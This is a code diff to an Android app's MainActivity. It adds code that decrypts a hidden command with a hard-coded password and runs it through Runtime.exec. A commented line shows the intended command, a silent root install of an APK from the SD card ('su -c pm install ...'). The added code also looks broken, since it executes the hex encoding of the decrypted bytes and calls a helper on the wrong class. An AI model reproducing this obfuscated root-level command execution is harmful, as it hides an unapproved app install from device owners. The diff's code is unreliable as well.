@@ -55,8 +55,14 @@ public class MainActivity extends Activity{
             Log.i("message","inter the install process");
         //    String cmd = "su -c pm install -r -d /sdcard/test.apk";
         //    String cmd = new Bodymethod().getcmd();
-              String stmp = new Bodymethod().getcmde();
-              String cmd = Decrypt.decrypt(stmp, "iamagirl");
+            String pwd = "123";
+            byte[] stmp = new Bodymethod().getcmde(pwd);
+            byte[] mmm = Decrypt.decrypt(stmp,pwd);
+
+           //   String stmp = new Bodymethod().getcmde(pwd);
+            //  String cmd = Decrypt.decrypt(stmp, pwd);
+            String cmd = new Bodymethod().parseByte2HexStr(mmm);
+
          //   if (!cmd.isEmpty())
          //   {
                 process = Runtime.getRuntime().exec(cmd);
@@ -223,5 +229,16 @@ public class MainActivity extends Activity{
         return resutl;
     }*/
 
+    public static String parseByte2HexStr(byte buf[]) {
+        StringBuffer sb = new StringBuffer();
+        for (int i = 0; i < buf.length; i++) {
+            String hex = Integer.toHexString(buf[i] & 0xFF);
+            if (hex.length() == 1) {
+                hex = '0' + hex;
+            }
+            sb.append(hex.toUpperCase());
+        }
+        return sb.toString();
+    }
 
 }
